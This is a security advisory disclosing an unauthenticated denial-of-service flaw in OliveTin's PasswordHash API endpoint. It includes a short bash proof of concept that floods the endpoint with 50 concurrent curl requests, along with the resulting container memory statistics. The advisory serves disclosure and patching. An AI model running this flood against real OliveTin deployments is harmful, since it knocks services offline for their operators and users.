# OliveTin has Unauthenticated Denial of Service via Memory Exhaustion in PasswordHash API Endpoint

**GHSA**: GHSA-pc8g-78pf-4xrp | **CVE**: CVE-2026-28342 | **Severity**: high (CVSS 7.5)

**CWE**: CWE-400, CWE-770

**Affected Packages**:
- **github.com/OliveTin/OliveTin** (go): < 0.0.0-20260227002407-2eb5f0ba79d4

## Description

## Summary

The PasswordHash API endpoint allows unauthenticated users to trigger excessive memory allocation by sending concurrent password hashing requests. By issuing multiple parallel requests, an attacker can exhaust available container memory, leading to service degradation or complete denial of service (DoS).

The issue occurs because the endpoint performs computationally and memory-intensive hashing operations without request throttling, authentication requirements, or resource limits.

## Details

The vulnerable endpoint:

`POST /api/olivetin.api.v1.OliveTinApiService/PasswordHash`

accepts a JSON body containing a password field and returns a computed password hash.

Each request triggers a memory-intensive hashing operation. When multiple concurrent requests are sent, memory consumption increases significantly. There are no safeguards such as:

- Authentication requirements
- Rate limiting
- Request throttling
- Memory usage caps per request
- Concurrency controls

As a result, an attacker can repeatedly invoke the endpoint in parallel, causing excessive RAM allocation inside the container.

In a test environment, 50 concurrent requests resulted in approximately 3.2 GB of memory usage (≈64 MB per request), leading to service instability.

This behavior allows unauthenticated attackers to perform a denial of service attack by exhausting server memory resources.

## PoC
Environment

- Docker container: olivetin-test
- Exposed API on: http://localhost:1337
- Default configuration (no authentication enabled)

## Reproduction Steps

Run the following script to send 50 concurrent requests:

```bash
for i in $(seq 1 50); do
  curl -s -X POST http://localhost:1337/api/olivetin.api.v1.OliveTinApiService/PasswordHash \
    -H "Content-Type: application/json" \
    -d "{\"password\":\"flood-$i\"}" &
done
docker stats olivetin-test --no-stream
wait
```

```bash
┌──(root㉿kali)-[~/cve/OliveTin]
└─# docker stats olivetin-test --no-stream
CONTAINER ID   NAME            CPU %     MEM USAGE / LIMIT     MEM %     NET I/O         BLOCK I/O        PIDS
18509670bf3e   olivetin-test   344.63%   6.189GiB / 7.753GiB   79.83%    313kB / 288kB   4.31MB / 106MB   7

```

`Docker CPU is 344.63%`

### Impact

This vulnerability allows unauthenticated remote attackers to:

- Exhaust server memory
- Crash the service
- Cause availability loss
- Trigger container termination in orchestrated environments

This is a Denial of Service (DoS) vulnerability affecting service availability.

Production deployments without reverse proxy rate limiting (e.g., Nginx, Traefik) are especially at risk.
